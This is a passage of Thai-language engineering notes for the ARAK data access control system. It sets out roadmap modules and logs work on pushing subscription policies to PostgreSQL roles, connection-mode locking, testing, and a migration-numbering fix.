   **ถอดรหัสใน proxy (5.2) ฝั่ง Java เท่านั้น** — ห้ามใส่กุญแจลงใน DDL ของ secure view เพราะใครอ่าน definition ของ view ได้ก็ได้กุญแจ · secure view / native จึงเป็น "ทำไม่ได้" ใน capability matrix
3. **Tokenization / FPE แบบย้อนกลับได้** — mask function ใหม่ `TOKENIZE` (deterministic · join ข้าม table ได้) และ `FPE` (NIST FF1 — เลขบัตร 13 หลักยังเป็นเลข 13 หลัก) ·
   `DETOKENIZE` เป็นสิทธิ์แยก ขอผ่าน access request (M9) หรือ break-glass · ทุกครั้งที่ถอด = 1 แถวใน audit พร้อมเหตุผล
4. **In transit** — บังคับ TLS ทุก source (`sslmode=verify-full` บน PG · ตรวจ cert บน MSSQL) และแสดงสถานะใน Health ของ Dashboard (M10)
5. **At rest ของ ARAK เอง** — `audit_query.original_sql` / `rewritten_sql` มักมีค่าจริงใน `WHERE` → เลือกเข้ารหัส column นี้ได้ · ไฟล์แนบ (AP.11)

**ข้อที่ห้ามทำ** — ตามข้อตัดสินใจที่ 8 ARAK **ไม่ ALTER COLUMN / ไม่เข้ารหัสข้อมูลใน table ของลูกค้าแทนเขา** (ไม่เขียนข้อมูลลง source) · Always Encrypted และ DDM ของ MSSQL อยู่นอกขอบเขต ·
กุญแจ · plaintext ที่ถอดแล้ว และ IP ของผู้ใช้ ห้ามอยู่ใน response ของ log ใดๆ

### AP.14 M23 — Personal Security Health Dashboard (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้ขอ *"หน้าต่างแดชบอร์ดส่วนตัว ที่บอกว่าตอนนี้เรามีสิทธิ์เข้าถึงอะไรบ้างและปลอดภัยไหม"* · ต่างจาก M10 ตรงที่ M10 เป็นภาพรวมทั้งองค์กรสำหรับ admin / author / auditor ส่วน M23 **ทุกคนเปิดได้และเห็นแค่ของตัวเอง**

| ส่วน | เนื้อหา | ของที่มีอยู่แล้ว |
|---|---|---|
| **ฉันเข้าถึงอะไรได้** | ทุก table ที่เข้าได้ พร้อมบอกว่า**ได้มาทางไหน** (grant ตรง · policy ตาม role / team / attribute · เป็น owner) · สิ่งที่ถูก mask หรือกรองแถว · ระดับความอ่อนไหว (PII · M20) | engine ตอบได้ทีละ table แล้ว (Simulator · explainability) · ต้องทำตัวรวบรวมทั้ง catalog แบบ cache |
| **กำลังจะหมด** | grant ที่ใกล้หมดอายุ + นับถอยหลัง · ปุ่มขอต่ออายุ (M9) | ✅ M9 slice 2c (requester เห็นของตัวเองอยู่แล้ว) |
| **ใช้จริงแค่ไหน** | query ของฉัน 30 วัน · ถูกปฏิเสธกี่ครั้งเพราะอะไร · **สิทธิ์ที่ไม่ได้ใช้ ≥ 90 วัน + ปุ่มคืนสิทธิ์เอง** | query log (M10) · `audit_decision` |
| **ปลอดภัยไหม** | checklist แทนคะแนนลอยๆ: มีสิทธิ์ PII ที่ไม่ได้ใช้ · grant ไม่มีวันหมดอายุ · เข้าถึงนอกเวลาทำงาน · query นอก IP ปกติ · ความผิดปกติที่ M19 จับได้ · กิจกรรมล่าสุดในชื่อฉัน (ถ้าไม่ใช่ฉัน → แจ้ง security) | M19 (ยังไม่ทำ) |

**กฎ** — เห็นเฉพาะของตัวเอง (principal = คนที่ login) · ห้ามโชว์ IP ดิบแม้จะเป็นของตัวเอง (โชว์ได้แค่ "เครือข่ายปกติ / ไม่ปกติ") · ไม่บอกว่ามี table ที่ตัวเองไม่มีสิทธิ์อยู่ · คืนสิทธิ์ = revoke grant ของตัวเอง + บันทึก audit

### AP.15 M24 — Automated Query Risk Blocker (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้ขอให้ *"ตรวจสอบและสกัดกั้น Query ที่เสี่ยงเกินไป ก่อนที่คำสั่งจะรันใน Database"* — เตือนก่อนทำพัง (ดึงเยอะเกิน · ลืม WHERE) และกันข้อมูลรั่วแบบไม่ได้ตั้งใจ

**ที่มีแล้วใน proxy (5.2):** SELECT อย่างเดียว · fail-closed เมื่อ parse หรือ resolve table ไม่ครบ · policy ถูกเขียนลงใน statement ก่อนส่ง · จำกัดแถว `MAX_ROWS` 5,000 (default 200) · timeout 30 วินาที

**ที่จะทำ** — ด่านใหม่ **หลัง rewrite และก่อน execute** ใน `QueryService.run`:
1. **กฎตรวจโครงสร้าง (deterministic ไม่ใช้ AI)** จาก AST ของ JSqlParser: ไม่มี WHERE / LIMIT บน table ใหญ่ (ขนาดจาก catalog หรือ `pg_class.reltuples`) · cartesian join / join ไม่มีเงื่อนไข · `SELECT *` บน table ที่มี PII · ดึง column PII จำนวนมาก · subquery ซ้อนลึก · `ORDER BY` บน table ใหญ่ที่ไม่มี index
2. **ประเมิน cost ด้วย `EXPLAIN`** (ไม่ใช่ `EXPLAIN ANALYZE` — ห้ามรันจริง) บน statement ที่ rewrite แล้ว → estimated rows / cost
3. **คะแนนความเสี่ยง + action ที่ admin ตั้งได้ใน Configure:** `ALLOW` · `WARN` (ต้องกดยืนยัน) · `REQUIRE_PURPOSE` (ต้องใส่เหตุผล → ลง audit) · `BLOCK` (เสนอให้ขอสิทธิ์พิเศษหรือแก้ query)
4. **AI ช่วยอธิบาย (M11 gateway)** — ส่ง**โครงสร้างของ query ที่ตัดค่าจริงออกแล้ว** (literal → `?`) + metadata เท่านั้น ตามกฎ "LLM เห็นแค่ metadata" · LLM อธิบายและเสนอ query ที่ปลอดภัยกว่า **แต่ไม่เป็นคนตัดสิน** — การบล็อกมาจากกฎข้อ 1–3 เสมอ
5. **เรียนจากพฤติกรรม** — ใช้ baseline ของ M19 (เช่น ปกติดึง 10 แถว วันนี้ 5,000 ตอนตี 3) มาเพิ่มคะแนน
6. ผลการประเมินลง `audit_query` (คะแนน · กฎที่โดน · action) และเห็นใน query log / Dashboard (M10)

### AP.16 M25 — On-Demand Test Data Synthesis (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้ขอ *"ระบบแปลงตารางจริงเป็นข้อมูลจำลอง (Synthetic Data) อัตโนมัติ"* ให้ Data Analyst / Dev เอาไปเทรนโมเดลหรือทดสอบ app ได้ทันที โดยไม่มีข้อมูลลูกค้าจริงหลุด (Differential Privacy + Generative AI)

**ข้อที่ต้องบอกตรงๆ** — *"ความสัมพันธ์เหมือนตารางจริง 100%"* กับ *"ปลอดภัย 100%"* **เป็นไปพร้อมกันไม่ได้** · ยิ่งเหมือนจริงมาก ยิ่งเสี่ยงหลุดข้อมูลจริง (เช่น แถวที่มีลักษณะเฉพาะตัว) ·
ระบบจะให้ตั้ง **ค่า ε ของ Differential Privacy** (ยิ่งต่ำ ยิ่งปลอดภัย แต่เหมือนจริงน้อยลง) และ**รายงานคะแนน fidelity และ privacy ทุกครั้ง** แทนการอ้าง 100%

**การทำงาน**
1. **Profile ผ่าน proxy** — อ่านสถิติ (distribution · ความสัมพันธ์ระหว่าง column · cardinality) ด้วย**สิทธิ์ของคนขอ** (column ที่ถูก mask ก็ได้สถิติของค่าที่ mask) · ใส่ noise แบบ DP ตั้งแต่ขั้นนี้
2. **Generate** — โมเดลสถิติที่รันใน ARAK เอง (Gaussian copula ก่อน · CTGAN / TVAE ทีหลัง) · **รักษา PK / FK ข้าม table** จาก `tableConstraints` ของ OpenMetadata ·
   LLM ใช้ได้แค่สร้างค่าที่ดูสมจริงจาก**ชื่อและคำอธิบายของ column** (ชื่อคน · ที่อยู่) — **ห้ามส่งแถวจริงให้ LLM**
3. **ตรวจก่อนส่งมอบ** — ไม่มีแถวที่ตรงกับแถวจริง (exact / near match) · membership-inference test · คะแนน fidelity ต่อ column และต่อคู่ column
4. **ส่งมอบ** — ดาวน์โหลด CSV / Parquet หรือเขียนลง **sandbox database ที่ลงทะเบียนไว้เป็นปลายทางของ synthetic data และ ARAK เป็นเจ้าของ object** (ตามข้อตัดสินใจที่ 8 — ไม่เขียนลง table ของลูกค้า)
5. **คุมสิทธิ์** — ต้องมีสิทธิ์อ่าน table ต้นทางก่อน (ขอผ่าน M9 ได้) · ชุดข้อมูลติด label `synthetic` + ε + ที่มา · ทุกครั้งที่สร้างลง audit

### AP.17 M31–M36 — Object ที่ ARAK ควรเก็บเพิ่ม นอกจาก Data Access Policy (ผู้ใช้ขอ 2026-09-28)

ผู้ใช้ถาม *"นอกจาก Data Access Policy แล้ว ควรมี Object อื่นอีกไหมที่เก็บ"* แล้วสั่ง *"ใส่ใน Roadmap"* · spec เต็มอยู่ที่ DESIGN **FR-21 – FR-26**

**เส้นแบ่ง** — OpenMetadata เก็บว่าข้อมูลคืออะไร (glossary · domain · data product · lineage) · ARAK เก็บว่า**ใครใช้ได้ ใช้เพื่ออะไร และมีหลักฐานอะไรยืนยัน** · ของที่ OM มีแล้วไม่เก็บซ้ำ

| # | Object | ทำไม | ต่อกับของที่มี |
|---|---|---|---|
| **M31** | **Purpose** | purpose วันนี้เป็นข้อความพิมพ์เอง 4 ที่ (`context.purpose` ใน policy · คำขอ · `purposes` ของ template · `audit_query.purpose`) — นับและเทียบกันไม่ได้ · ทำเป็น object ที่มีฐานกฎหมาย PDPA · เจ้าของ · ระยะสิทธิ์สูงสุด แล้วตอบ auditor ได้ว่า "PII ถูกใช้เพื่ออะไร" | policy · access request · template · grant · query / export · Dashboard |
| **M32** | **Access Review** | grant มีวันหมดอายุ แต่ไม่มีใครทบทวนว่ายังควรมีไหม · campaign + รายการต่อ grant (keep / revoke / shorten + เหตุผล) · ห้ามทบทวนสิทธิ์ตัวเอง · เห็นวันที่ใช้ล่าสุด | grant (revoke เดิม = tombstone + audit) · query log M10 · inbox |
| **M33** | **Project / Workspace** | ทีม + purpose + table + วันจบ · project เป็น principal แบบ group · ออกจาก project สิทธิ์หายทันที | local group (V35) · M27 ขอสิทธิ์ในนามกลุ่ม · ต้องมี M31 |
| **M34** | **Rule ที่ใช้ซ้ำได้** | mask / row filter ตั้งชื่อครั้งเดียว หลาย policy อ้าง · วันนี้เขียนซ้ำในแต่ละ policy · แก้ rule แล้วโชว์ impact + เข้าประวัติ M17 | Policy IR · impact analysis (FR-5.3) · M17 |
| **M35** | **Policy test case** | "คน X เปิด table Y ต้องเห็น column Z ถูก mask" รันผ่าน Simulator ทุก save / activate และทุกคืน · activate ไม่ได้ถ้า test พัง (เว้นแต่ใส่เหตุผล) | Simulator (FR-5.2) · M30b ใช้ไฟล์ชุดเดียวกัน |
| **M36** | **Service account / API client** | principal ที่ไม่ใช่คน · เจ้าของต้องเป็นคน · scope · token เก็บแค่ hash + วันหมดอายุ · อนุมัติคำขอไม่ได้ | ฐานของ M14 (Org Key) · M21 · M29 · M30 |

**ไม่เก็บใน ARAK** — glossary / domain / lineage / data quality (ของ OM) · consent / retention (ของระบบต้นทาง)

### AP.8 ลำดับที่แนะนำ

```
M9 + M13  ทำพร้อมกัน  (ปุ่มขอสิทธิ์ต้องมีปลายทางรับ)
M14       ทำแยกได้เลย  (ไม่ขึ้นกับใคร แต่ต้องรอ M3 นิ่ง ซึ่งนิ่งแล้ว)
M10 → M15 (ข)          ✅ เสร็จ (ข้อ CJ)
M15 (ก)   ✅ เสร็จ (ข้อ CI)
M13 → M16              ✅ เสร็จ (ข้อ CK) — ปุ่ม "ขอสิทธิ์" ของ M13 เป็นปลายทางของกองที่สอง
                        · flag "ปฏิเสธโดยไม่บอกอะไร" ยังค้าง (ต้องครอบ Catalog + แชท + find-data พร้อมกัน)
M17       ✅ เสร็จ (ข้อ CA) — รวมข้อ 5 audit_policy_change แล้ว
M18 → M6  (M6 คือ NativeCompiler ต่อ engine — ถ้าทำ M6 ก่อน M18
           จะได้ switch เพิ่มมาอีกชุดที่ต้องมารื้อทีหลัง)
M18 ก่อนเพิ่ม engine ตัวที่ 3 เสมอ
M10 → M19 (M19 ต้องใช้ query log และ `audit_query.asset_fqns` ที่ M10 ทำ ·
           slice 3 ต้องใช้ flow ขอสิทธิ์ของ M9 / M13 ที่มีแล้ว)
M20       ทำแยกได้เลย  (engine มีครบแล้ว ขาด scheme ที่เรียงลำดับได้ + operator + guardrail ระดับองค์กร)
ไฟล์แนบ M9  ทำแยกได้เลย  (ต่อจาก access_request ที่มีแล้ว · ต้องมี volume ที่ backup ได้บน prod ก่อนเปิดใช้)
M14 → M21 (agent เรียก ARAK ผ่าน public API · slice 7 ต้องมี M20 · slice 8 ต้องมี M19)
M22 ข้อ 1 (key management) ก่อนข้ออื่น · ข้อ 3 `DETOKENIZE` ขอผ่าน M9 · ข้อ 4 แสดงผลใน Health ของ M10
M10 → M23 (ใช้ query log ของ M10 · ส่วน "ปลอดภัยไหม" เต็มรูปแบบต้องมี M19)
M10 → M24 (ข้อ 1–3 ทำได้เลยหลัง query log · ข้อ 4 ต้องมี M11 · ข้อ 5 ต้องมี M19)
M25 ทำแยกได้ (profile ผ่าน proxy ที่มีแล้ว · sandbox ใช้ source registry ของ M18)
M31 → M32 → M33  (Purpose ก่อน: รอบทบทวนและ project อ้าง purpose · M33 รวม M27)
                  M31a ✅ (ข้อ CN) · M31b slice 1 ✅ (ข้อ CO · ม.26) · slice 2a ✅ (ข้อ CS · grant purpose) · slice 2b (รายงาน PII) ต่อได้เลย
M34 · M35 ทำแยกได้ (M35 ก่อน M30b — `arak test` ใช้ไฟล์ชุดเดียวกัน)
M36 → M14 · M21 · M29 · M30 (ทุกตัวต้องมี principal ที่ไม่ใช่คนก่อน)

2026-09-24 ผู้ใช้สั่งสลับลำดับ: **M18 ขึ้นก่อนทุกอย่าง และเริ่มที่ฝั่ง proxy**
  (`ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`) → เหตุผลอยู่ที่ AP.7a
```

---

## รอบนี้ — **ข้อ DB: push ตามโหมดของ connection (แก้กติกาของข้อ DA)**

ผู้ใช้ (2026-10-04): *"Connection 1 อัน ถ้า set เป็น proxy ก็คือ ใช้ proxy ทั้ง Subscription และ data policy ถ้า set เป็น Push down ก็ต้องทั้ง Subscription และ data policy"* · ข้อ DA ทำ push เป็น tab ต่อ policy ที่ plan / apply ได้แม้ source ตั้งเป็น Query proxy → ผิดกติกานี้ · *"แก้เลย แล้วทดสอบใหม่หมด เขียน case excel ให้ใหม่ด้วย"* · *"อย่าให้กระทบ proxy เดิม"*
branch `sakan/native-follows-connection-mode` → PR · **ยังไม่ merge ยังไม่ deploy** (รอผู้ใช้สั่ง)

**การตัดสินใจของผู้ใช้ (2026-10-04)**
- โหมดเป็นของ connection (`data_source.default_enforcement_mode`) ไม่ใช่ของ policy · ไม่ต้องแยก policy ตามโหมด
- แก้ฝั่ง subscription ตอนนี้ · push ของ Data policy **เพื่อนทำ** (ใช้ push account / gate / ล็อกโหมดชุดเดียวกัน)
- source ที่เป็น Native **ยัง query ผ่าน ARAK ได้** — proxy ไม่ดูโหมด และข้อนี้ไม่แตะ proxy เลย
- prod: ตอน deploy เปลี่ยน source PostgreSQL ของ prod เป็น Native source config (ทำเมื่อผู้ใช้สั่ง deploy)

**ทำอะไร**
- `NativeSubscriptionService` — plan / apply บน source ที่ไม่ใช่ `NATIVE_CONFIG` → 422 *"<source> is enforced by the query proxy, not native source config, so its policies are not pushed to it as roles…"* (ลง audit `REFUSED`) · apply ตรวจโหมดซ้ำ (plan ตอน Native แล้วสลับโหมดก่อน apply → ปฏิเสธ ไม่มี role เกิด)
- **role ที่ค้างใต้โหมดอื่น** (เช่น apply ไว้บน build ของ PR #16 แล้วตั้ง source เป็น proxy) — Check ตอบ `PENDING` + *Nobody should hold the role: roll it back* · sweep ถอนทุกคนและทุก grant ของ ARAK (`EXPIRE` *"Taken away because nobody should hold the role: …"*) · role ยังอยู่จนกว่าจะ rollback · rollback / rollback-plan ทำได้ทุกโหมด
- `DataSourceStore.update` — เปลี่ยนโหมดออกจาก Native ไม่ได้ (409 *"… Roll them back first …"*) ถ้ายังมี role ที่ apply แล้วและยังไม่ rollback · เงื่อนไขอยู่ใน `UPDATE … WHERE` เดียวกัน apply จึงแทรกกลางไม่ได้ · เปลี่ยน**เป็น** Native ได้เสมอ · save โดยไม่เปลี่ยนโหมดได้เสมอ
- frontend — tab *PostgreSQL roles*: source ที่ไม่ใช่ Native ขึ้นป้าย *Not set to native* + บอกว่า enforce ด้วยโหมดไหน · ปุ่ม Plan / Apply กดไม่ได้ (Check / Roll back ยังกดได้) · `api/nativeSubscription.ts` ได้ `mode` ของ source · หน้า *Where it runs*: subscription + Native config บน PostgreSQL ขึ้น *Pushed as PostgreSQL roles* · `modeNote(source, mode, kind)` รับ `kind` เพิ่ม · **ข้อความของ Data policy เหมือนเดิม**
- docs — `user-guide.md` (PostgreSQL roles · sweep · Common questions) · DESIGN M6

**ทดสอบ**
- IT: `NativeSubscriptionServiceIT` 33 · `DataSourceStoreIT` 21 · backend ทั้งชุด: backend `./mvnw -o -Pintegration verify` BUILD SUCCESS · unit 1,437 · integration 562 · รวม 1,999 ไม่มี fail
- frontend: jest 88 suites / 917 ผ่าน · type-check ผ่าน · eslint ของไฟล์ที่แก้ผ่าน (error ที่เหลือเป็นของ `shot-*.mjs` ในเครื่อง ไม่ได้ commit)
- **ทดสอบกับ PostgreSQL 16 จริงในเครื่องใหม่หมดบน build สุดท้าย 72/72 ผ่าน** — NS-01 – NS-60 (ทุก case ของข้อ DA เริ่มจากศูนย์ · demo-pg เป็น Native) + NM-01 – NM-12 ใหม่:
  - NM-01 – NM-08 อัปเกรดจาก build ของ PR #16 ที่ตั้งโหมดเป็น proxy ทั้งที่มี role อยู่ → plan ถูกปฏิเสธ · Check เตือน · sweep แรกถอนทุกคน (`2 role(s) checked, 2 revoked from`) · ล็อกโหมด · rollback ได้
  - NM-10 / NM-11 ไม่มี role → เปลี่ยนเป็น proxy ได้ · plan ตอน Native แล้วสลับโหมด → apply ถูกปฏิเสธ
  - NM-09 / NM-12 **proxy เหมือนเดิมทุก query** — 10 statement × 41 local user = 410 query (58 ตอบ 200 / 98 แถว) · build ของ PR #16 เทียบ build สุดท้ายทั้งโหมด proxy และ Native → **0 ต่าง**
- **`Testing/native-subscription-postgres-test-cases.xlsx` เขียนใหม่** — 72 case + demo D-00 *One connection, one mode* · ก่อน demo ตั้ง demo-pg เป็น Native (sheet Demo setup)

**ส่งต่อเพื่อน (push ของ Data policy)** — ผู้ใช้ได้ข้อความไปส่งต่อแล้ว
- ใช้ push account ตัวเดียวกัน (`native_credential` ต่อ source) · gate `nativeMode(source)` · flow plan → apply → check → rollback → sweep · audit ลง `audit_enforcement`
- ล็อกโหมดใน `DataSourceStore.update` ดูแค่ `native_role` → ต้องเพิ่มตารางของฝั่ง data เข้าไปในเงื่อนไขเดียวกัน
- push account ตอนนี้ไม่พอสำหรับ RLS — `ENABLE ROW LEVEL SECURITY` / `CREATE POLICY` ต้องเป็น owner ของ table (DBA grant owner role ให้ = สิทธิ์ใหญ่มาก หรือ DBA รัน script ของ ARAK เอง) · **ยังไม่ตัดสินใจ**
- ⚠️ เปิด RLS แล้ว role ที่ไม่มี policy เห็น 0 แถว **รวม login ของ proxy** → plan ต้องมี policy ให้ login ของ proxy (`USING (true)`) และบอกคนอื่นที่จะเสียแถว · rollback ห้าม disable RLS ที่เปิดอยู่ก่อน ARAK
- column grant ไม่มีผลถ้า role ถือ SELECT ทั้ง table → ต้องแก้ `PostgresGrantCompiler` ร่วมกัน · `NativeMembership` ตอนนี้กันคนที่มี row filter / mask / hidden column ที่ Read ออกทั้ง role · mask บน PG ต้องใช้ `anon` → ปฏิเสธไปก่อน

**ยังไม่ได้ทำ / prod**
- merge + deploy รอผู้ใช้สั่ง → แล้วเปลี่ยน source PostgreSQL ของ prod เป็น Native source config
- DBA ยังต้องสร้าง push account บน prod (ข้อความที่ส่งไปแล้วใช้ได้ ไม่ต้องแก้) → หลังจากนั้นทดสอบ native บน prod + Excel ของ prod
- ข้อนี้ไม่มี migration · migration ใหม่ถัดไปยังเป็น **V48**

## รอบก่อน — **ข้อ DA: Subscription policy ลงไปเป็น role บน PostgreSQL (M6 · 5.1.1 · push-down ส่วนแรก)**

ผู้ใช้ปลด hold ของ M6 เฉพาะส่วนนี้ (2026-10-01) และอนุมัติแผน: *"ทำเลย เอาตามที่แนะนำได้เลย … ทดสอบให้ครบทุก Case … ทำเป็น Case แยกเพื่อเอาไว้ demo"* · *"เขียน excel test case ไว้ใน Folder Testing ด้วย"*
ส่วนอื่นของ M6 (PG RLS · column GRANT · `anon` · MSSQL) **ยัง hold อยู่**

**ทำอะไร** — subscription policy หนึ่งตัว = role หนึ่งตัวต่อ source ชื่อ `arak_sub_<policy 8 ตัวแรก>_<source 8 ตัวแรก>` (NOLOGIN · comment "Managed by ARAK…")
- **Browse** = `CONNECT` + `USAGE` (ไม่มีแถว) · **Read** = Browse + `SELECT` บนทุก table ที่ policy ครอบ
- สมาชิกคือ login เดิมของคนที่ policy ให้เข้า (map ใน `db_principal_map`) · **ARAK ไม่สร้าง login เอง** · PG16+ ให้ membership แบบ `WITH INHERIT TRUE, SET FALSE`
- ขั้นตอน: **Plan** (ไม่แตะ source) → อ่าน → **Apply this plan** (admin) · **Check** เทียบ source · **Roll back** (admin) · sweep ทุก 10 นาที **ถอนอย่างเดียว**

**การตัดสินใจที่ผู้ใช้อนุมัติ (2026-10-01)**
- **A.** push account แยกจาก account ของ proxy — proxy ยัง read-only · ถ้าตั้ง push account เป็น login เดียวกับ proxy ARAK ปฏิเสธ (เทียบด้วยชื่อ login ไม่ใช่แค่ reference)
- **B.** role ให้สิทธิ์เท่ากันทุก table → ใครโดนปฏิเสธ table ไหนก็ตามใน role (DENY · ชั้นที่ไม่ให้ผ่าน · exemption · ที่ Read ถ้ามี data policy กรองแถว / mask / ซ่อน column) **ไม่ได้เข้า role ทั้ง role** (fail closed) · plan บอกว่าเสีย table ไหนไปบ้าง
- **C.** role เช็คเวลา / IP / purpose / `context.` ไม่ได้ → policy แบบนั้น plan ไม่ได้ (banner *A database role cannot carry this policy*) · DENY policy ไม่มี role ของตัวเอง — มันกันคนออกจาก role ของ ALLOW ที่ทับกัน
- **D.** `CONNECT` ของ `PUBLIC` บน database — เตือนอย่างเดียว ไม่แก้ให้

**ไฟล์**
- `dac-compiler-sql` — `PostgresGrantCompiler` (สร้าง script apply + rollback · golden `native-grant-postgres.sql`)
- `dac-connector-source` — `NativeGrantApplier` (อ่านสภาพจริงบน source · ตรวจ push account · รัน script ใน transaction · แยก grant ของ ARAK ออกจาก grant ของคนอื่นด้วย grantor)
- `dac-service/enforcement` — `NativeSubscriptionService` (plan / apply / check / rollback / sweep) · `NativeMembership` (ใครเข้า ใครไม่เข้า และเหตุผล) · `NativeRoleStore` · `NativeLoginMap` · `NativeReviews` (plan ถือไว้ใน process แบบเดียวกับ secure view — restart แล้ว plan หาย ต้อง plan ใหม่) · `NativeSubscriptionJob` (sweep)
- `dac-service/resources/NativeSubscriptionResource` — `/v1/native-subscription/…` · wiring ใน `DacApplication`
- frontend — `api/nativeSubscription.ts` · `pages/policies/subscription/NativePushPanel.tsx` (+ test) · tab **PostgreSQL roles** ใน `PolicyDetailPage` (ซ่อนสำหรับ data policy · แก้ไฟล์ร่วมนี้แค่เพิ่ม tab)

**Migration V47** `native_subscription` — `native_credential` (push account ต่อ source · เก็บเป็น reference เท่านั้น) · `native_role` (role ละแถว · ไม่มี FK ไป policy เพราะ policy ที่ archive แล้วยังมี role ค้างจนกว่าจะ rollback และ sweep ต้องหาเจอ) · ขยาย check ของ `audit_enforcement` (`EXPIRE` · `CONFIGURE` · outcome `PENDING` / `CHANGED`)
- **migration ใหม่ถัดไปคือ V48** — บอกเพื่อนและคนทำ MySQL ให้ pull main ก่อนตั้งเลข

**Endpoint** (`/api/v1/native-subscription`) · ทั้ง class ต้องเป็น PLATFORM_ADMIN / POLICY_AUTHOR / DATA_OWNER

| | admin | author |
|---|---|---|
| `PUT` / `DELETE` `sources/{id}/credential` | ✅ | — |
| `GET sources/{id}/logins` · `GET sources/{id}/history` | ✅ | ✅ |
| `PUT` / `DELETE` `sources/{id}/logins…` | ✅ | — |
| `POST policies/{id}/plan` · `check` · `rollback-plan` | ✅ | ✅ |
| `POST policies/{id}/apply` · `rollback` | ✅ | — |

- credential ไม่เคยถูกส่งกลับใน API · map login ให้ตัวเองไม่ได้ · ทุก plan / apply / check / sweep / rollback / CONFIGURE ลง `audit_enforcement`

**ตั้ง push account บน PG** (ทำโดย DBA · ชื่อสมมติ)
- `CREATE ROLE <push> LOGIN CREATEROLE PASSWORD '<…>'` — **ห้าม superuser** (PG บันทึก grant ของ superuser เป็นของ owner → ARAK แยกไม่ออกว่า grant ไหนของตัวเอง) และห้ามเป็น login เดียวกับ proxy
- ต้องถือ grant option: `GRANT CONNECT ON DATABASE <db> TO <push> WITH GRANT OPTION` · `GRANT USAGE ON SCHEMA <s> TO <push> WITH GRANT OPTION` · `GRANT SELECT ON <table> TO <push> WITH GRANT OPTION` (หรือเป็น owner)
- **PG16**: คนที่มี CREATEROLE แล้วสร้าง role จะได้ membership แบบ ADMIN ใน role นั้นอัตโนมัติ → push account จะโผล่เป็นสมาชิกของ `arak_sub_*` · ARAK รู้และไม่นับเป็นสมาชิก
- login ของคน (`<person login>`) ต้องมีอยู่แล้ว · ARAK ไม่สร้าง ไม่แก้ ไม่ drop

**เรื่องที่ต้องรู้**
- **Browse กับ catalogue**: `information_schema` ซ่อน table ที่ไม่มีสิทธิ์ แต่ `pg_tables` / `pg_attribute` ยังเห็นชื่อ table และ column ทุกตัว → plan เตือน (เป็นพฤติกรรมของ PG ไม่ใช่ของ ARAK)
- **grant ของคนอื่น**: ARAK เป็นเจ้าของเฉพาะ grant ที่ grantor เป็น push account · grant ที่คนอื่นให้ role ของ ARAK → รายงาน ไม่ revoke · rollback แล้วถ้ายังมี grant ของคนอื่นค้าง role ไม่ถูก drop
- **DBA จะถอน grant ที่ ARAK ให้ไว้** ต้องใส่ `GRANTED BY <push>` ไม่งั้น PG ถอนไม่ได้ (grant เป็นของ push account) · หรือให้ทำผ่าน ARAK (plan → apply / rollback)
- **sweep** — ทุก 10 นาที (`Duration.ofMinutes(10)` ใน `DacApplication` · ยังไม่ได้ทำเป็น config) · ถอนคนที่ไม่ผ่านแล้ว (ออกจากกลุ่ม · unmap login · policy ถูก disable / หมดอายุ) · บันทึก `EXPIRE` / `APPLIED` โดย `system:native-sweep` · **ไม่เพิ่มใคร** — คนใหม่เข้าตอน apply รอบหน้า · role ที่ต้องเพิ่ม grant → สถานะ *Behind the policy* (`PENDING`) หรือ `DRIFTED` · ข้าม source ที่ปิดอยู่และ source ที่ไม่มี push account / push account เป็น login ของ proxy
- **Apply ปฏิเสธ** plan ที่ apply ไปแล้ว · ของ policy อื่น · หมดอายุ · หรือไม่ตรงกับ policy / source ตอนนี้แล้ว (fingerprint)
- **table ใน database อื่น** บน server เดียวกัน — ตัดออกพร้อมเตือน เพราะ role ได้ CONNECT database เดียว · policy ที่ไม่ครอบ table ไหนใน database ของ source → plan ไม่ได้ (ถ้ามี role อยู่แล้ว เป็นคำเตือนว่า apply จะเอาทุกอย่างออก แล้วให้ rollback เพื่อ drop)

**ทดสอบ**
- unit / IT: `PostgresGrantCompilerTest` 18 · `NativeGrantApplierIT` 24 (Testcontainers PG) · `NativeMembershipTest` 15 · `NativeSubscriptionServiceIT` 29 · backend ทั้งชุด 217 class / 1437 tests ผ่าน
- frontend: jest 88 suites / 911 ผ่าน · type-check ผ่าน · eslint ของไฟล์ที่แก้ผ่าน (error ที่เหลือเป็นของ `shot-*.mjs` ในเครื่อง ไม่ได้ commit)
- **ทดสอบกับ PostgreSQL 16 จริงในเครื่อง 60/60 case ผ่าน** + demo D-01 – D-12 → **`Testing/native-subscription-postgres-test-cases.xlsx`** (sheet Summary · Test cases · Demo cases · Demo setup · รหัสผ่านเขียนเป็น `<demo password>` เท่านั้น)
- docs: `user-guide.md` (*PostgreSQL roles* · bullet ใน Data sources · คำถามใน Common questions) · DESIGN M6

**ยังไม่ได้ทำ / ต้องตัดสินใจ**
- **apply บน prod** — role ของ PG เป็นของทั้ง cluster → ต้องถามผู้ใช้ก่อนสร้าง push account / `arak_sub_*` / login demo บน prod ทุกครั้ง
- ความถี่ sweep ยัง hard-code 10 นาที · plan ถือใน memory (หลาย instance = ต้อง sticky หรือย้ายไป DB)
- ส่วนที่เหลือของ M6 (RLS · column GRANT · `anon` · MSSQL) ยัง hold

## รอบก่อน — **`start.sh` ลบ migration ที่ค้างใน `target/classes` ก่อน build backend**

หลัง PR #14 (V45 → V46) ขึ้น prod แล้ว service ยังไม่ start — jar ใหม่ยังมี `V45__mysql_engine.sql` ติดไปคู่กับ `V46__mysql_engine.sql` → Flyway เจอ V45 สองไฟล์เหมือนเดิม
- สาเหตุ: build บน prod เป็นแบบ incremental (ไม่ `clean`) · ไฟล์ resource ที่ถูกลบหรือเปลี่ยนชื่อใน source ยังค้างอยู่ใน `target/classes` และถูกอัดเข้า jar
- แก้: ก่อน `mvnw package` ลบ `backend/*/target/classes/db/migration` ทุกครั้ง (Maven copy ใหม่ทุก build อยู่แล้ว)
- ใส่ `deploy/start.sh` เข้าไปใน stamp ของ backend ด้วย — แก้วิธี build แล้วต้อง build ใหม่ ไม่งั้น prod เห็น stamp เท่าเดิมแล้วข้าม build
- ทดสอบในเครื่อง: วางไฟล์ V45 เก่าไว้ใน `target/classes` แล้วรันขั้นตอนเดียวกับ `start.sh` → jar มีแค่ V44 · V45 `grant_purpose` · V46 `mysql_engine`
- **migration ใหม่ถัดไปคือ V47**

## รอบก่อน — **แก้ migration เลขซ้ำ: `V45__mysql_engine.sql` → `V46__mysql_engine.sql`**

